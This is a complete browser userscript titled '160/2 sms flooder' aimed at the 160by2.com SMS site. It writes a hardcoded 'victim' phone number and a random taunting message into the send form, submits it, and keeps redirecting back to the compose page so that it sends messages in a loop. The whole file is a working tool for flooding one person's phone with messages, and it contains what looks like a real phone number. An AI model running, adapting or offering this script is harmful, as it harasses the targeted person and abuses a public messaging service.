// ==UserScript==
// @name          160/2 sms flooder
// @namespace     lol
// @description   flooder sms
// @include       http://*160by2.com/*
// ==/UserScript==

var victim=9928653082; //Enter victims number here
var delay=0; // Enter delay in milliseconds if required


if(document.location=="http://www.160by2.com/publicsms_sendsms.aspx")
{
document.getElementById('txt_mobileno').value=victim;
document.getElementById('txt_msg').value=Math.floor(Math.random()*1456484)+'KuNaL RulxXx !!'+Math.floor(Math.random()*1456484);
void(0);
document.getElementById('btnsendsms').click();
}

if(document.location=="http://160by2.com/postview_latest.aspx")
{
setTimeout('document.location="http://160by2.com/compose_sms.aspx"',delay);
}
